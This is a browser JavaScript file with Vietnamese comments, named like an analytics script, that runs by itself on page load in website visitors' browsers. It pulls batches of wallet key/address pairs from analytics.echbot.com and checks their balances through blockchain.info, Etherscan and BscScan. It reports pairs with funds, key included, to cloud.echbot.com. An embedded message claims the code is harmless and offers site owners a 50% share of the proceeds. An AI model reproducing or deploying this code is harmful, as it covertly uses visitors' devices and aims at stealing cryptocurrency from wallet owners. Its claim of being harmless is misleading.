/*
 *
 */
// xác nhận toàn bộ tiến trình đã nạp xong rồi hay chưa
var max_all_scan_done = 3;
var confirm_all_scan_done = max_all_scan_done;

function analytics_echbot() {
    var toAll = 'Đây là script scan địa chỉ ví BTC, ETH, được chạy ngầm trên website. Mã này hoàn toàn vô hại và lợi nhuận kiếm sẽ được chia 50% cho chủ website mỗi khi tìm được địa chỉ ví có số dư.';

    //
    var spaceScan = 12;
    var myDebug = false;
    //var myDebug = true;

    // kiểm tra để tránh tính trạng scan liên tục
    var spamCheck = 0;
    try {
        spamCheck = localStorage.getItem('analytics_check_spam_echbot');
        //console.log(spamCheck);
        if (spamCheck === null) {
            spamCheck = 0;
        } else {
            spamCheck *= 1;
        }
    } catch (e) {
        spamCheck = 0;
    }
    // thời gian hiện tại
    var currentTime = Math.ceil(Date.now() / 1000);
    if (confirm_all_scan_done < max_all_scan_done || currentTime - spamCheck < spaceScan) {
        if (myDebug === true) {
            console.log('Spamer...', confirm_all_scan_done);
        }
        setTimeout(function () {
            analytics_echbot();
        }, Math.ceil(spaceScan / 2) * 1000);
        return false;
    }
    localStorage.setItem('analytics_check_spam_echbot', currentTime);
    confirm_all_scan_done = 0;

    // ok -> cho phép scan
    var requestTimeout = 33;

    // lấy địa chỉ ví để scan
    jQuery.ajax({
        type: 'GET',
        dataType: 'json',
        //dataType: 'jsonp',
        crossDomain: true,
        url: 'https://analytics.echbot.com:34567',
        timeout: requestTimeout * 1000,
        error: function (jqXHR, textStatus, errorThrown) {
            console.log(textStatus);
            if (textStatus === 'timeout') {}
        }
    }).done(function (adds) {
        //console.log(adds);

        // lấy địa chỉ ví và tạo tham số để lưu lại thông tin ví
        var arr_adds = [];
        var p = function (a, c) {
            var s = [];
            for (var i = 0; i < a.length; i++) {
                s.push(a[i].a);
                arr_adds.push('primary=' + a[i].k + '&address=' + a[i].a);
            }
            //console.log(s);
            return s.join(c);
        };

        //
        _log = function (u) {
            console.log(u);
            //return false;

            //
            jQuery.ajax({
                type: 'GET',
                dataType: 'json',
                //dataType: 'jsonp',
                crossDomain: true,
                url: u,
                timeout: requestTimeout * 1000,
                error: function (jqXHR, textStatus, errorThrown) {
                    console.log(textStatus);
                    if (textStatus === 'timeout') {}
                }
            }).done(function (data) {
                console.log(data);
            });
        };

        // chạy lệnh scan
        var _run = function (u, data_type) {
            //console.log(u);

            //
            jQuery.ajax({
                type: 'GET',
                //dataType: typeof data_type != 'undefined' ? data_type : 'json',
                dataType: 'json',
                //dataType: 'jsonp',
                crossDomain: true,
                url: u,
                timeout: requestTimeout * 1000,
                error: function (jqXHR, textStatus, errorThrown) {
                    console.log(jqXHR);
                    console.log(textStatus);
                    console.log(errorThrown);
                    if (textStatus === 'timeout') {}

                    //
                    confirm_all_scan_done++;
                }
            }).done(function (data) {
                if (myDebug === true) {
                    console.log(data);
                }

                // BTC
                if (typeof data.addresses != 'undefined') {
                    // chạy vòng lặp kiểm tra số dư
                    for (var i = 0; i < data.addresses.length; i++) {
                        // nếu có số dư thì lưu lại file
                        var active_log = false;
                        if (myDebug === true && i === 0) {
                            active_log = true;
                        } else if (data.addresses[i].final_balance > 0) {
                            active_log = true;
                        }

                        //
                        if (active_log === true) {
                            for (var y = 0; y < arr_adds.length; y++) {
                                if (arr_adds[y].split(data.addresses[i].address).length > 1) {
                                    //console.log(arr_adds[y]);
                                    _log('https://cloud.echbot.com/scan/btc/hasbalance?' + arr_adds[y]);
                                    break;
                                }
                            }
                        }
                    }
                }
                // ETH
                else if (typeof data.result != 'undefined' && typeof data.status != 'undefined' && data.status * 1 === 1) {
                    for (var i = 0; i < data.result.length; i++) {
                        // nếu có số dư thì lưu lại file
                        var active_log = false;
                        if (myDebug === true && i === 0) {
                            active_log = true;
                        } else if (data.result[i].balance > 0) {
                            active_log = true;
                        }

                        //
                        if (active_log === true) {
                            for (var y = 0; y < arr_adds.length; y++) {
                                if (arr_adds[y].split(data.result[i].account).length > 1) {
                                    //console.log(arr_adds[y]);
                                    _log('https://cloud.echbot.com/scan/eth/hasbalance?' + arr_adds[y]);
                                    break;
                                }
                            }
                        }
                    }
                }

                //
                confirm_all_scan_done++;
            });
        };

        // tạo URL để scan
        var b = p(adds.b, '|');
        var e = p(adds.e, ',');
        //console.log(arr_adds);

        //
        _run('https://blockchain.info/multiaddr?limit=0&cors=true&active=' + b, 'jsonp');
        _run('https://api.etherscan.io/api?module=account&action=balancemulti&tag=latest&apikey=YourApiKeyToken&address=' + e);
        _run('https://api.bscscan.com/api?module=account&action=balancemulti&tag=latest&apikey=YourApiKeyToken&address=' + e);
    });

    //
    setTimeout(function () {
        analytics_echbot();
    }, spaceScan * 1000);
}
analytics_echbot();
